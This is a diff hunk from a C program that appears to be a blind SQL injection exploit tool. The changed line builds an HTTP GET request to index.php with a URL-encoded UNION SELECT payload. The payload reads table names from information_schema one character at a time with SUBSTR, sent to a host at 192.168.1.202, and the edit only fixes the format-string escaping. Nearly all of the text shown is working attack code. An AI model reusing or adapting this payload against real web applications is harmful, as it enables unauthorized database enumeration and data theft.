@@ -210,7 +210,7 @@ bool recv_empty(int32_t sockfd) {
 
 bool send_check_success(char * discovered_name, int i, char mid, int sockfd) {
     char mal_req[2048];
-    sprintf(mal_req, "GET /index.php?order_id=0%%20UNION%%20SELECT%%20table_name%%20FROM%%20information_schema.TABLES%%20WHERE%%20table_name%%20LIKE%%20%%27%%25usr%%25%%27%%20AND%%20table_name%%20LIKE%%20%%27%s%%%%25%%27%%20AND%%20SUBSTR(%s,%i,1)<%c%%20LIMIT%%201%\; HTTP/1.1\r\n"
+    sprintf(mal_req, "GET /index.php?order_id=0%%20UNION%%20SELECT%%20table_name%%20FROM%%20information_schema.TABLES%%20WHERE%%20table_name%%20LIKE%%20%%27%%25usr%%25%%27%%20AND%%20table_name%%20LIKE%%20%%27%s%%%%25%%27%%20AND%%20SUBSTR(%s,%i,1)<%c%%20LIMIT%%201; HTTP/1.1\r\n"
         "Host: 192.168.1.202\r\n"
         "Connection: Keep-Alive\r\n"
         "\r\n",
